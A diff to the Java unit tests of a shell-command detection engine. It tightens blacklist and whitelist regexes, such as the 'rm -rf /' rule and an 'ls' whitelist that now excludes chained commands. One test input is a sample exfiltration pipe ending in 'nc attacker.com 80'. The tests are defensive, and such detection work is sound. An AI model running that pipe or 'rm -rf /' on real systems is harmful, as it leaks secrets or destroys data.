@@ -78,7 +78,7 @@ class DetectionEngineTest {
                 .id("test-rm-root")
                 .name("rm root")
                 .blacklist()
-                .pattern("rm\\s+.*-rf.*\\s+/")
+                .pattern("rm\\s+.*-rf.*\\s+/\\s*$")
                 .riskLevel(RiskLevel.DANGER)
                 .build());
     }
@@ -191,7 +191,7 @@ class DetectionEngineTest {
         testRules.add(Rule.builder()
                 .id("w-ls")
                 .whitelist()
-                .pattern("^\\s*ls\\b")
+                .pattern("^\\s*ls\\b(?!.*[;|&<>])")
                 .build());
         testRules.add(Rule.builder()
                 .id("b-danger")
@@ -200,7 +200,7 @@ class DetectionEngineTest {
                 .riskLevel(RiskLevel.RISK)
                 .build());
 
-        // "ls" 在白名单，"danger" 不在白名单但匹配黑名单
+        // "ls" 在白名单（但带分号不匹配白名单），"danger" 不在白名单但匹配黑名单
         DetectionResult result = engine.detect("ls -la; danger cmd", testRules);
         assertFalse(result.isPassed());
     }
@@ -349,7 +349,7 @@ class DetectionEngineTest {
                 .riskLevel(RiskLevel.RISK)
                 .build());
 
-        DetectionResult result = engine.detect("cat file | grep secret | nc attacker.com 80", testRules);
+        DetectionResult result = engine.detect("cat file | grep secret | sort | nc attacker.com 80", testRules);
         assertFalse(result.isPassed());
     }
 
